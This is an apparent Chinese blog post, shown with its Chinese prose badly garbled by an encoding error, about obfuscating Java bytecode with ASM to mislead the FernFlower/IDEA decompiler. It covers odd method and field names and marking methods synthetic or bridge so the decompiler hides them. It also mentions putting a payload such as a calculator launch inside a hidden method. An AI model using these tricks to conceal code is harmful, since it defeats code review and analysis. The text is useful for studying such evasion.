å½“ä¸­æˆ‘ä¹Ÿä¼šå°½é‡ä¸ä½¿ç”¨è¿‡äºå¤æ‚çš„æ¦‚å¿µï¼Œç”¨å¤§å®¶æ›´èƒ½æ¥å—çš„å½¢å¼æ¥è®²è¿°ä¸€ä¸ªæ··æ·†çš„ä¾‹å­ï¼Œå½“ç„¶æœ‰äº›åœ°æ–¹å¯èƒ½è¡¨è¿°ä¹Ÿä¼šå­˜åœ¨è¡¨è¿°ä¸å½“çš„æƒ…å†µï¼Œè¯·è§è°…ï¼Œå…¨æ–‡æ–‡ç« ä»¥JDK8ä¸ºä¾‹(æ‡’ï¼Œå¹¶ä¸æƒ³æµ‹è¯•æ‰€æœ‰ç‰ˆæœ¬æ”¯æŒæƒ…å†µ)ã€‚ â€‹ åŒæ—¶åœ¨æ–‡ç« ä¸­ä¹Ÿä¼šåˆ†äº«éƒ¨åˆ†è®®é¢˜ä¸­æ²¡æœ‰è®²çš„å†…å®¹ï¼Œä¸»è¦æ˜¯åœ¨è®®é¢˜æ—¶è€ƒè™‘åˆ°æ—¶é—´åŸå› ä¸´æ—¶åšäº†åˆ é™¤è°ƒæ•´ã€‚ æ­£æ–‡å‰ç½®â€‹ é¦–å…ˆåœ¨å¼€å§‹ä¹‹å‰æˆ‘ä»¬éœ€è¦äº†è§£ASMçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼ŒASMå…¶å®æœ‰ä¸¤å¥—APIï¼Œä¸€ä¸ªæ˜¯Core APIï¼Œå¦ä¸€ä¸ªæ˜¯Tree APIï¼Œåœ¨è¿™é‡Œå¦‚æœä½ åªæ˜¯æƒ³è¦å­¦ä¹ åˆ°åœ¨ä»Šå¤©è®®é¢˜åˆ†äº«è¿‡ç¨‹å½“ä¸­çš„ä¸€äº›åŸºæœ¬åŸç†é‚£ä¹ˆæˆ‘è®¤ä¸ºäº†è§£Core APIçš„ç”¨æ³•å°±å¤Ÿäº†ï¼Œå¦‚æœä½ éœ€è¦åšå·¥å…·å¼€å‘ï¼Œé‚£ä¹ˆæˆ‘æ›´æ¨èä½¿ç”¨Tree APIå»å®Œæˆä¸€ä¸ªå·¥å…·çš„å¼€å‘ï¼ŒTree APIèƒ½æ›´çµæ´»çš„å¸®åŠ©æˆ‘ä»¬å®Œæˆæˆ‘ä»¬çš„éœ€æ±‚(æ¯”å¦‚æˆ‘ä»¬æƒ³è¦åœ¨æŸä¸ªæŒ‡å®šçš„å­—èŠ‚ç æ“ä½œååšæŒ‡ä»¤çš„æ·»åŠ )ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å­—èŠ‚ç å¤„ç†æ¡†æ¶ã€‚åœ¨è¿™é‡Œæˆ‘ä¸ä¼šèŠ±å¤§ç¯‡é‡çš„ç¯‡å¹…å»å†™ä¸€ä¸ªå…³äºASMçš„æ•™ç¨‹ï¼Œä½†æ˜¯å¯¹äºä¸€äº›å…³é”®çš„ç‚¹æˆ‘ä»ä¼šç‚¹å‡º(å…³äºASMçš„ä½¿ç”¨æ•™ç¨‹ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œå¯¹ä¸äº†è§£çš„ä½¿ç”¨æ–¹æ³•éƒ¨åˆ†å¯ä»¥å°è¯•å¤šç™¾åº¦)ã€‚ æµ‹è¯•ä»£ç è§https://github.com/Y4tacker/HackingFernFlower å¦‚ä½•ç”Ÿæˆä¸€ä¸ªç±»åœ¨è¿™é‡Œæˆ‘ä»¬æƒ³è¦ç”Ÿæˆè¿™æ ·çš„ä¸€ä¸ªç±»ï¼Œç±»åä¸ºTestã€å­—æ®µåä¸ºabcã€æ–¹æ³•åä¸ºtest é¦–å…ˆæˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªClassWriterå¯¹è±¡ 1ClassWriter classWriter = new ClassWriter(0); åœ¨è¿™ä¸ªæ„é€ å‡½æ•°å½“ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¼ å…¥å…¶ä»–é€‰é¡¹ï¼Œå¦‚ClassWriter.COMPUTE_FRAMES/ClassWriter.COMPUTE_MAX COMPUTE_MAXSï¼šåœ¨å†™å…¥æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è®¡ç®—æ–¹æ³•çš„æœ€å¤§å †æ ˆå¤§å°å’Œå±€éƒ¨å˜é‡è¡¨çš„å¤§å°ã€‚ COMPUTE_FRAMESï¼šåœ¨å†™å…¥æ–¹æ³•å­—èŠ‚ç æ—¶ï¼Œä¼šè‡ªåŠ¨è®¡ç®—æ–¹æ³•çš„å †æ ˆæ˜ å°„å¸§å’Œå±€éƒ¨å˜é‡è¡¨çš„å¤§å°ã€‚ä½¿ç”¨è¯¥å‚æ•°æ—¶ï¼ŒCOMPUTE_MAXSå‚æ•°ä¹Ÿä¼šè¢«è‡ªåŠ¨è®¾ç½®ã€‚ ä¸€èˆ¬è€Œè¨€åœ¨æ„é€ æ–¹æ³•ä¸­æˆ‘ä»¬éƒ½å¯ä»¥åŠ ä¸ŠClassWriter.COMPUTE_FRAMESé€‰é¡¹ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¸“å¿ƒå­—èŠ‚ç çš„æ„é€ ï¼Œä¸ç”¨è€ƒè™‘ max stacks ã€max localsä»¥åŠstack map framesçš„è®¡ç®—è¿‡ç¨‹ã€‚ ç”Ÿæˆä¸€ä¸ªç±»ï¼Œå‚æ•°åˆ†åˆ«æ˜¯Javaç‰ˆæœ¬å·ã€ä¿®é¥°ç¬¦ã€ç±»åã€ç­¾åã€çˆ¶ç±»ã€æ¥å£ï¼ˆå…³æ³¨çº¢è‰²å­—å³å¯ï¼‰ 1classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, &quot;Test&quot;, null, &quot;java/lang/Object&quot;, null); ç”Ÿæˆä¸€ä¸ªå­—æ®µï¼Œå‚æ•°åˆ†åˆ«æ˜¯ä¿®é¥°ç¬¦ã€å­—æ®µåã€å­—æ®µç±»å‹ã€ç­¾åã€å€¼ 1234&#123;fieldVisitor = classWriter.visitField(ACC_PUBLIC | ACC_STATIC, &quot;abc&quot;, &quot;Ljava/lang/String;&quot;, null, null);fieldVisitor.visitEnd();&#125; ç”Ÿæˆä¸€ä¸ªæ–¹æ³•ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ä¿®é¥°ç¬¦ã€æ–¹æ³•åã€*æ–¹æ³•æè¿°ç¬¦(å…¥å‚ä¸è¿”å›å€¼)*ã€ç­¾åã€å¼‚å¸¸ 12345678910&#123;methodVisitor = classWriter.visitMethod(ACC_PUBLIC | ACC_STATIC, &quot;test&quot;, &quot;()V&quot;, null, null);methodVisitor.visitCode();methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);methodVisitor.visitInsn(ICONST_1);methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(I)V&quot;, false);methodVisitor.visitInsn(RETURN);methodVisitor.visitMaxs(2, 0);methodVisitor.visitEnd();&#125; è‡ªå®šä¹‰æŸ¥çœ‹ä¸€ä¸ªç±»æ€ä¹ˆé€šè¿‡ASMä»£ç ç”Ÿæˆ(å¿…çœ‹)å½“ç„¶åœ¨å¼€å§‹ä¹‹å‰æˆ‘å¸Œæœ›ä½ å¤šäº†è§£ä¸‹ASMçš„ä¸€äº›ä»£ç å†™æ³•ï¼Œè‡ªå·±å¤šå†™å‡ ä¸ªç±»ï¼Œå¤šæŸ¥çœ‹å…¶ASMçš„ç”Ÿæˆä»£ç  åœ¨è¿™é‡Œæˆ‘æ•™å¤§å®¶å¦‚ä½•è‡ªå®šä¹‰æŸ¥çœ‹ä¸€ä¸ªç±»æ˜¯æ€ä¹ˆé€šè¿‡ASMä»£ç ç”Ÿæˆï¼Œå¤šæ¨¡ä»¿æ‰èƒ½æ›´ç†Ÿç»ƒ æ¯”å¦‚åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹Test.classè¯¥å¦‚ä½•ä½¿ç”¨ASMæ¡†æ¶çš„ä»£ç ç”Ÿæˆ é€šè¿‡æ‰§è¡Œä¸‹é¢çš„ä»£ç ä½ å¯ä»¥è·å¾—è¿™ä¸ªå†™æ³•(åˆå­¦æ—¶ä¸€å®šè¦å¯ç”¨å‚æ•°SKIP_DEBUGã€SKIP_FRAMES)ï¼Œåœ¨åé¢ç†Ÿç»ƒä»¥åå¯ä»¥å°è¯•å°†å…¶æ›¿æ¢ä¸ºint parsingOptions = ClassReader.EXPAND_FRAMES 123456789101112131415public static void main(String[] args) throws Exception&#123; //éœ€è¦å¤„ç†çš„Class String inputFilename = &quot;./target/classes/Test.class&quot;; String outputFilename = &quot;output.txt&quot;; FileInputStream fileInputStream = new FileInputStream(new File(inputFilename)); // SKIP_DEBUG:ç”¨äºæŒ‡ç¤ºClassReaderåœ¨è¯»å–ç±»æ–‡ä»¶æ—¶æ˜¯å¦è·³è¿‡è°ƒè¯•ä¿¡æ¯ã€‚è°ƒè¯•ä¿¡æ¯åŒ…æ‹¬æºä»£ç è¡Œå·ã€å±€éƒ¨å˜é‡åç§°å’ŒèŒƒå›´ç­‰ä¿¡æ¯ // SKIP_FRAMES:æŒ‡ç¤ºClassReaderåœ¨è¯»å–ç±»æ–‡ä»¶æ—¶æ˜¯å¦è·³è¿‡å¸§ä¿¡æ¯ã€‚å¸§ä¿¡æ¯æ˜¯ç”¨äºå­˜å‚¨æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†çš„æ•°æ®ç»“æ„ã€‚å¦‚æœæŒ‡å®šäº†SKIP_FRAMESå¸¸é‡ï¼Œé‚£ä¹ˆåœ¨è¯»å–ç±»æ–‡ä»¶æ—¶å°†ä¼šè·³è¿‡å¸§ä¿¡æ¯ï¼Œä»è€Œå‡å°‘è¯»å–å’Œå¤„ç†çš„æ—¶é—´å’Œå†…å­˜æ¶ˆè€— // EXPAND_FRAMESï¼šæŒ‡ç¤ºåœ¨ç”Ÿæˆç±»æ–‡ä»¶æ—¶æ˜¯å¦åº”è¯¥å±•å¼€å¸§ã€‚å¸§ç”¨äºåœ¨Javaç±»æ–‡ä»¶ä¸­è¡¨ç¤ºæ–¹æ³•çš„æ‰§è¡ŒçŠ¶æ€ï¼ŒåŒ…æ‹¬æ“ä½œæ•°æ ˆå’Œå±€éƒ¨å˜é‡è¡¨çš„å†…å®¹ã€‚å¦‚æœæŒ‡å®šäº†EXPAND_FRAMESå¸¸é‡ï¼Œé‚£ä¹ˆåœ¨ç”Ÿæˆç±»æ–‡ä»¶æ—¶å°†ä¼šå±•å¼€å¸§ä¿¡æ¯ï¼Œä»è€Œç¡®ä¿ç”Ÿæˆçš„ç±»æ–‡ä»¶åŒ…å«å®Œæ•´çš„å¸§ä¿¡æ¯ int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES; Printer printer = new ASMifier(); FileOutputStream fileOutputStream = new FileOutputStream(new File(outputFilename)); PrintWriter printWriter = new PrintWriter(fileOutputStream); TraceClassVisitor traceClassVisitor = new TraceClassVisitor(null, printer, printWriter); new ClassReader(fileInputStream).accept(traceClassVisitor, parsingOptions); &#125; ç†ŸçŸ¥çš„Javaå‘½åè§„åˆ™çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿå‘½åæ··æ·†æ¥ä¸‹æ¥é€šè¿‡ä¸€ä¸ªå¼€èƒƒå°èœæ¥å¸®åŠ©æˆ‘ä»¬ç†Ÿæ‚‰ASMçš„ä½¿ç”¨æ–¹æ³• åœ¨å­¦ä¹ Javaçš„æ—¶å€™ï¼Œç¬¬ä¸€è¯¾é€šå¸¸éƒ½æ˜¯æ•™æˆ‘ä»¬ä¸€äº›ç¼–ç¨‹è§„èŒƒï¼Œå…¶ä¸­å°±åŒ…å«å‘½åçš„è§„èŒƒï¼Œä¸€èˆ¬è€Œè¨€æ˜¯ä¸‹é¢è¿™å‡ ç§æƒ…å†µï¼Œç„¶è€ŒçœŸçš„æ˜¯è¿™æ ·ä¹ˆï¼Ÿ è¿™éƒ½æ˜¯å¸¸æ€åŒ–çš„æ€ç»´å›ºåŒ–äº†æˆ‘ä»¬ï¼Œç†æ‰€å½“ç„¶çš„è®¤ä¸ºå˜é‡ååªèƒ½æ˜¯ åç§°åªèƒ½ç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€$ç¬¦å·ç»„æˆï¼Ÿ ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Ÿ åç§°ä¸èƒ½ä½¿ç”¨JAVAä¸­çš„å…³é”®å­—ï¼Ÿ åšå†³ä¸å…è®¸å‡ºç°ä¸­æ–‡åŠæ‹¼éŸ³å‘½åï¼Ÿ é€šè¿‡æµ‹è¯•å¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œè¿™ä¸ªé™åˆ¶å…¶å®åªå‘ç”Ÿåœ¨ç¼–è¯‘çš„è¿‡ç¨‹(javac)ï¼Œè€Œåœ¨æ‰§è¡Œè¿‡ç¨‹æ— é™åˆ¶(java) 123456789101112131415161718int start = 0;int end = 65535;String jdk = &quot;jdk8u341&quot;;boolean onlyDefineClass = true;System.out.println(&quot;---ä»¥ä¸‹æ˜¯åœ¨defineClassä¸‹æµ‹è¯•_&#123;jdk&#125;--&quot;.replace(&quot;&#123;jdk&#125;&quot;,jdk));for (int i = start; i &lt;= end; i++) &#123; char unicodeChar = (char) i; FuzzMethodName(unicodeChar, jdk, onlyDefineClass); FuzzFieldName(unicodeChar, jdk, onlyDefineClass);&#125;System.out.println(&quot;----------------------------&quot;);onlyDefineClass = false;System.out.println(&quot;---ä»¥ä¸‹åœ¨édefineClassä¸‹æµ‹è¯•_&#123;jdk&#125;--&quot;.replace(&quot;&#123;jdk&#125;&quot;,jdk));for (int i = start; i &lt;= end; i++) &#123; char unicodeChar = (char) i; FuzzMethodName(unicodeChar, jdk, onlyDefineClass); FuzzFieldName(unicodeChar, jdk, onlyDefineClass);&#125; åœ¨è¿™é‡Œæˆ‘ä»¬ä»…ä»…åªæ˜¯æƒ³è¦è®©å¤§å®¶çŸ¥é“åœ¨ä¸åŒå°ç‰ˆæœ¬é—´æœ‰å·®å¼‚ï¼Œæˆ‘æ²¡æœ‰å»æ¯”å¯¹æ¯ä¸€ä¸ªç‰ˆæœ¬ï¼Œåªæƒ³è®©å¤§å®¶çŸ¥é“ä¸åŒç‰ˆæœ¬é—´æœ‰ä¸€äº›å·®å¼‚å³å¯ Jdk8u20 jdk8u341 å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹å‚æ•°nameä¸ºä»»æ„æˆ‘ä»¬æƒ³è¦çš„å€¼ 12345&#123; fieldVisitor = classWriter.visitField(ACC_PUBLIC| ACC_STATIC| ACC_FINAL,&quot;abc&#123;\\nsuper man supersuper\\n&#125;&quot;,&quot;[Ljava/lang/String;&quot;,null,null); fieldVisitor.visitEnd(); &#125; å› æ­¤æˆ‘ä»¬å¯ä»¥å®ç°è¿™æ ·çš„ç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°åœ¨è§†è§‰ä¸Šéå¸¸å…·æœ‰æ··æ·†çš„æ•ˆæœ(æµ‹è¯•ç¯å¢ƒjdk8u20ï¼Œé«˜ç‰ˆæœ¬ä¸‹éƒ¨åˆ†å­—æ¯ä¸æ”¯æŒ) ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡åœ¨fuzzçš„è¿‡ç¨‹å½“ä¸­æˆ‘å‘ç°ï¼Œå½“æ–¹æ³•å(æˆ–å…¶ä»–å‚æ•°)ä¸­å‡ºç°äº†\\r(é€€æ ¼é”®)è¿™ä¸ªå­—ç¬¦ï¼Œå‡ºç°äº†è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼Œç±»æ— æ³•æ‹–å…¥IDEAå½“ä¸­åšåç¼–è¯‘äº†é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œjava -cp org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -jar fernflower.jar /Users/y4tacker/Desktop/MCMSv/HackingFernflower/output/Test.class ./testcodeï¼Œå‘ç°å¯ä»¥æ­£å¸¸åç¼–è¯‘ï¼Œå› æ­¤å¯ä»¥çŒœæµ‹å’ŒIDEAå…¶ä»–ç»„ä»¶éƒ¨åˆ†ä»£ç æœ‰å…³ï¼Œè¿™é‡Œå’Œä¸»é¢˜æ— å…³å°±ä¸ç»§ç»­æ·±å…¥ç ”ç©¶äº† åŒæ—¶é€šè¿‡ç»ˆç«¯æŸ¥çœ‹å­—èŠ‚ç æ—¶ä¹Ÿä¼šå‘ç°ï¼Œè¿™é‡Œçš„æ˜¾ç¤ºä¹Ÿå¾ˆæ··ä¹±(å’Œ\\ré€€æ ¼é”®åœ¨æ§åˆ¶å°ä¸­çš„è¾“å‡ºä½œç”¨æœ‰å…³)ï¼Œå½“ç„¶å¦‚æœä½ é€šè¿‡javap -v Testå°†å†…å®¹è¾“å‡ºåˆ°æ–‡ä»¶ä¸­æ‰“å¼€å¯æ­£å¸¸æŸ¥çœ‹ å…³æ³¨åç¼–è¯‘å™¨çš„é»˜è®¤é…ç½®å…³äºfernflowerçš„ä»£ç å¯ä»¥åœ¨githubä¸ŠæŸ¥æ‰¾åˆ°ç¤¾åŒºç‰ˆçš„ä»£ç ,https://github.com/fesh0r/fernflower å½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨IDEAä¸­è·å–åˆ°ä¸“ä¸šç‰ˆä»£ç ï¼Œä»¥macä¸ºä¾‹å­ï¼Œå³é”®ç¨‹åºæ˜¾ç¤ºåŒ…å†…å®¹ï¼Œä½ç½®åœ¨IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib åœ¨org.jetbrains.java.decompiler.main.extern.IFernflowerPreferenceså½“ä¸­æœ‰ä¸€äº›é»˜è®¤é…ç½® è¿™é‡Œä»…åˆ—å‡ºäº†é»˜è®¤æ¿€æ´»çš„å±æ€§(å€¼ä¸º1) 123456789101112131415161718defaults.put(REMOVE_BRIDGE, &quot;1&quot;);defaults.put(REMOVE_SYNTHETIC, &quot;0&quot;);defaults.put(DECOMPILE_ENUM, &quot;1&quot;);defaults.put(USE_DEBUG_VAR_NAMES, &quot;1&quot;);defaults.put(USE_METHOD_PARAMETERS, &quot;1&quot;);defaults.put(FINALLY_DEINLINE, &quot;1&quot;);defaults.put(DECOMPILE_INNER, &quot;1&quot;);defaults.put(DECOMPILE_CLASS_1_4, &quot;1&quot;);defaults.put(DECOMPILE_ASSERTIONS, &quot;1&quot;);defaults.put(IDEA_NOT_NULL_ANNOTATION, &quot;1&quot;);defaults.put(NO_EXCEPTIONS_RETURN, &quot;1&quot;);defaults.put(REMOVE_GET_CLASS_NEW, &quot;1&quot;);defaults.put(ENSURE_SYNCHRONIZED_MONITOR, &quot;1&quot;);defaults.put(BOOLEAN_TRUE_ONE, &quot;1&quot;);defaults.put(UNDEFINED_PARAM_TYPE_OBJECT, &quot;1&quot;);defaults.put(HIDE_EMPTY_SUPER, &quot;1&quot;);defaults.put(HIDE_DEFAULT_CONSTRUCTOR, &quot;1&quot;);defaults.put(REMOVE_EMPTY_RANGES, &quot;1&quot;); ä»è¿™äº›é»˜è®¤é…ç½®å½“ä¸­æˆ‘ä»¬å‘ç°äº†å‡ ä¸ªæœ‰è¶£çš„é…ç½®é€‰é¡¹ 12345REMOVE_BRIDGE(æ¡¥æ¥æ–¹æ³•)REMOVE_SYNTHETIC(è™½ç„¶æ˜¯0,ä½†æ˜¯é€šè¿‡IDEAåç¼–è¯‘çš„æ—¶å€™ä»ç„¶å¯ä»¥åšåˆ°éšè—çš„æ•ˆæœï¼ŒçŒœæµ‹è¿è¡Œæ—¶ä¿®æ”¹äº†é»˜è®¤å±æ€§java -jar fernflower.jar -rsy=1 xxx.class)USE_DEBUG_VAR_NAMES(å¯¹åº”org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyDebugInfo)USE_METHOD_PARAMETERS(å¯¹åº”org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyParameterNames) REMOVE_BRIDGE/REMOVE_SYNTHETICéšè—æ–¹æ³•å‘ç°è¿™ä¸ªå±æ€§çš„è¯»å–ä¸å¤„ç†åœ¨æœ€ç»ˆä»£ç çš„æ‹¼æ¥è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯åœ¨org.jetbrains.java.decompiler.main.ClassWriter#classToJava å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬èƒ½è®©hideä¸ºtrueï¼Œé‚£ä¹ˆå°±èƒ½è®©å½“å‰æ–¹æ³•çš„è¾“å‡ºè¢«è·³è¿‡ å¦‚ä½•è®©hideä¸ºtrueï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸‰ä¸ªæ¡ä»¶ï¼Œæ»¡è¶³å…¶ä¸€å³å¯ mt.isSynthetic()å¹¶ä¸”REMOVE_SYNTHETICå±æ€§ä¸º1 æ–¹æ³•æ˜¯æ¡¥æ¥æ–¹æ³•å¹¶ä¸”REMOVE_BRIDGEå±æ€§ä¸º1 åœ¨hiddenmenmerså¯¹è±¡å½“ä¸­ isSynthetic/isBridgeåœ¨å¼€å§‹å‰æˆ‘ä»¬å¯ä»¥æ€è€ƒä¸ºä»€ä¹ˆIDEAä¼šé€‰æ‹©éšè—è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„æ–¹æ³• Psï¼šä¸€äº›ç®€å•çš„å¤‡æ³¨ï¼Œæ›´è¯¦ç»†çš„å¯ä»¥ç™¾åº¦çœ‹çœ‹ æ¡¥æ¥æ–¹æ³•ï¼ˆbridge methodï¼‰æ˜¯ä¸ºäº†è§£å†³Javaæ³›å‹æ“¦é™¤å¸¦æ¥çš„é—®é¢˜è€Œå¼•å…¥çš„ä¸€ä¸ªæ¦‚å¿µã€‚å½“ä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ³›å‹æ¥å£æˆ–ç»§æ‰¿äº†ä¸€ä¸ªæ³›å‹ç±»æ—¶ï¼Œç”±äºJavaçš„æ³›å‹æ“¦é™¤æœºåˆ¶ï¼Œä¼šå¯¼è‡´ç»§æ‰¿æˆ–å®ç°çš„æ–¹æ³•ç­¾åå‘ç”Ÿå˜åŒ–ï¼Œè¿™å¯èƒ½ä¼šå¼•å‘ç¼–è¯‘å™¨è­¦å‘Šæˆ–é”™è¯¯ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒJavaç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨ç”Ÿæˆæ¡¥æ¥æ–¹æ³•ï¼Œæ¥ç¡®ä¿æ–¹æ³•ç­¾åçš„ä¸€è‡´æ€§ã€‚è¿™äº›æ¡¥æ¥æ–¹æ³•é€šå¸¸æ˜¯åˆæˆçš„ï¼Œå®ƒä»¬çš„ç›®çš„æ˜¯å°†çˆ¶ç±»ä¸­çš„æ³›å‹æ–¹æ³•é‡å†™ä¸ºéæ³›å‹æ–¹æ³•ï¼Œä»¥ä¾¿åœ¨ç»§æ‰¿é“¾ä¸­ä¿æŒæ–¹æ³•ç­¾åçš„ä¸€è‡´æ€§ã€‚æ¡¥æ¥æ–¹æ³•é€šå¸¸æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œå¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨ç¼–å†™æ¡¥æ¥æ–¹æ³•ã€‚åœ¨Javaå­—èŠ‚ç ä¸­ï¼Œæ¡¥æ¥æ–¹æ³•çš„æ ‡å¿—é€šå¸¸æ˜¯ ACC_BRIDGEã€‚æ¡¥æ¥æ–¹æ³•åœ¨Javaä¸­æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œå®ƒç¡®ä¿äº†åœ¨ä½¿ç”¨æ³›å‹æ—¶ï¼Œç»§æ‰¿å’Œå®ç°å…³ç³»çš„æ­£ç¡®æ€§å’Œä¸€è‡´æ€§ã€‚ syntheticæ–¹æ³•æ˜¯ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„ã€ä¸æ˜¯ç”±å¼€å‘äººå‘˜ç›´æ¥ç¼–å†™çš„æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•é€šå¸¸å…·æœ‰ç‰¹æ®Šçš„ç›®çš„ï¼Œå¦‚æ”¯æŒå†…éƒ¨ç±»ã€å¤–éƒ¨ç±»ä¹‹é—´çš„è®¿é—®ã€Javaè™šæ‹Ÿæœºçš„å®ç°ç»†èŠ‚ç­‰ã€‚syntheticæ–¹æ³•é€šå¸¸æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”åœ¨ç±»çš„å­—èŠ‚ç ä¸­ä½¿ç”¨ACC_SYNTHETICæ ‡å¿—è¿›è¡Œæ ‡è®°ã€‚ ä¸€äº›å¸¸è§çš„æƒ…å†µä¸‹ä¼šç”Ÿæˆsyntheticæ–¹æ³•ï¼Œå¦‚ï¼š å†…éƒ¨ç±»ï¼šå½“åˆ›å»ºå†…éƒ¨ç±»æ—¶ï¼Œç¼–è¯‘å™¨é€šå¸¸ä¼šç”Ÿæˆä¸€ä¸ªsyntheticæ–¹æ³•ï¼Œç”¨äºåœ¨å†…éƒ¨ç±»ä¸­è®¿é—®å¤–éƒ¨ç±»çš„ç§æœ‰æˆå‘˜å˜é‡æˆ–ç§æœ‰æ–¹æ³•ã€‚ æšä¸¾ç±»ï¼šå¯¹äºæšä¸¾ç±»ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰æšä¸¾å€¼çš„é™æ€finalæ•°ç»„ï¼Œå¹¶ä¸”ç”Ÿæˆä¸€ä¸ªsyntheticæ–¹æ³•ç”¨äºè®¿é—®è¿™ä¸ªæ•°ç»„ã€‚ Lambdaè¡¨è¾¾å¼ï¼šåœ¨ä½¿ç”¨Lambdaè¡¨è¾¾å¼æ—¶ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç”Ÿæˆsyntheticæ–¹æ³•æ¥æ”¯æŒLambdaè¡¨è¾¾å¼çš„æ‰§è¡Œã€‚ é¦–å…ˆæ¥çœ‹å¦‚ä½•æ»¡è¶³isSyntheticçš„æ¡ä»¶ï¼Œä¿®é¥°ç¬¦å¸¦ACC_SYNTHETICå³å¯ï¼Œæˆ–è€…å¸¦Syntheticå±æ€§å³å¯ 12345public boolean isSynthetic() &#123; return hasModifier(CodeConstants.ACC_SYNTHETIC) || hasAttribute(StructGeneralAttribute.ATTRIBUTE_SYNTHETIC);&#125;public static final Key&lt;StructGeneralAttribute&gt; ATTRIBUTE_SYNTHETIC = new Key&lt;&gt;(&quot;Synthetic&quot;); é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ASMå¾ˆç®€å•çš„ä¸ºæ–¹æ³•æ·»åŠ ä¿®é¥°ç¬¦(ACC_BRIDGE/ACC_VOLATILE/ACC_STATIC_PHASEéƒ½æ˜¯0x0040) 1234cw.visitMethod(ACC_PUBLIC | ACC_SYNTHETIC, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_BRIDGE, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_VOLATILE, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_STATIC_PHASE, &quot;abc&quot;, &quot;()V&quot;, null, null); å¦‚ä½•é€šè¿‡ASMä¸ºæ–¹æ³•æ·»åŠ å±æ€§,è°ƒç”¨methodVisitor.visitAttribute(new SyntheticAttribute());å³å¯ Psï¼šè‡ªå®šä¹‰å®ç°çš„SyntheticAttributeç±»æ„é€ å‡½æ•°å½“ä¸­çš„superä»£è¡¨å±æ€§çš„type æˆåŠŸå®ç°å¯¹abcæ–¹æ³•çš„éšè— å¯¹äºæ¡¥æ¥æ–¹æ³•çš„æ¡ä»¶ï¼Œå’Œä¸Šé¢åŒç†ï¼Œä¸å†é‡å¤è®²è§£ï¼Œè¿™é‡Œä»…åˆ—å‡ºæ•ˆæœå›¾ å¦‚ä½•è½¬æ¢ä¸€ä¸ªç±»(å¤‡æ³¨ç¯‡)å¯èƒ½æœ‰äººä¼šå¥½å¥‡èƒ½ä¸èƒ½é€šè¿‡ASMè½¬æ¢ç°æœ‰çš„æ–¹æ³•å‘¢ï¼Ÿå½“ç„¶å¯ä»¥ å†™ä¸€ä¸ªç±»ç»§æ‰¿ClassVisitor ä¸²è”ClassWriterå³å¯ ç»“åˆIDEAçš„æ˜¾ç¤ºç‰¹æ€§è¾¾åˆ°è¿·æƒ‘æ•ˆæœï¼ŒåŒæ—¶æˆ‘ä»¬åœ¨éšè—çš„æ–¹æ³•å½“ä¸­åŠ ç‚¹æ–™ï¼Œæ¯”å¦‚æ‰§è¡Œä¸€ä¸ªè®¡ç®—å™¨ hiddenMemberså¯¹è±¡è¿‡æŸ¥æ‰¾å‘ç°hiddenMembersçš„æ·»åŠ ä¸»è¦åœ¨å‡ ä¸ªProcessoræ–¹æ³•ä¸‹ å’Œæ–¹æ³•ç›¸å…³çš„æ¯”è¾ƒå¥½ç”¨çš„æœ‰EnumProcessorå’ŒClassReference14Processorï¼Œè¿™é‡Œä»…ä»¥EnumProcessorä¸ºä¾‹ 